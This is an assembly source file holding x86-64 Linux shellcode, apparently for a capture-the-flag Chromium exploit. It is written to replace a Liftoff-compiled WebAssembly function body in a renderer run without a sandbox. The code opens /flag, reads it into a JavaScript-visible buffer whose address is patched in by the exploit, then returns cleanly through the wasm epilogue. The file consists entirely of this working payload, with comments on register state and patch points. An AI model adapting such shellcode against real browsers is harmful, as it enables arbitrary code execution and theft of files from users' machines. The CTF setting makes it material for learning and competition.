; flag-read shellcode for the Chromium renderer (x86-64 Linux, no seccomp
; because the bot runs chrome with --no-sandbox).
;
; Drop-in replacement for the body of a Liftoff-compiled wasm function:
;   entry state  : rbp = frame pointer set by the wasm prologue (push rbp; mov rbp,rsp)
;   exit         : mov rsp,rbp / pop rbp / ret  -> normal wasm epilogue
;   clobbers     : rax rcx rdx rsi rdi r10 r11  (all caller-saved)
;   returns      : eax = number of bytes read (also stored in the buffer)
;
; BUF is patched at runtime by the exploit with the absolute address of a
; JS-visible ArrayBuffer backing store:
;     [BUF+0]  = open() return value  (fd, or -errno)
;     [BUF+8]  = read() return value  (length, or -errno)
;     [BUF+16] = flag bytes
BITS 64
default rel

_start:
        mov     r10, 0x1122334455667788      ; <- patched: BUF
        mov     rax, 0x0000000067616c662f    ; "/flag",0
        push    rax
        mov     rdi, rsp                     ; path
        xor     esi, esi                     ; O_RDONLY
        xor     edx, edx                     ; mode
        mov     eax, 2                       ; __NR_open
        syscall
        mov     [r10], rax                   ; record fd / -errno
        mov     edi, eax                     ; fd
        lea     rsi, [r10+16]                ; buf
        mov     edx, 0x200                   ; count
        xor     eax, eax                     ; __NR_read
        syscall
        mov     [r10+8], rax                 ; record length / -errno
        mov     eax, 3                       ; __NR_close
        syscall
        mov     eax, [r10+8]                 ; return the length in eax
        mov     rsp, rbp                     ; wasm epilogue
        pop     rbp
        ret
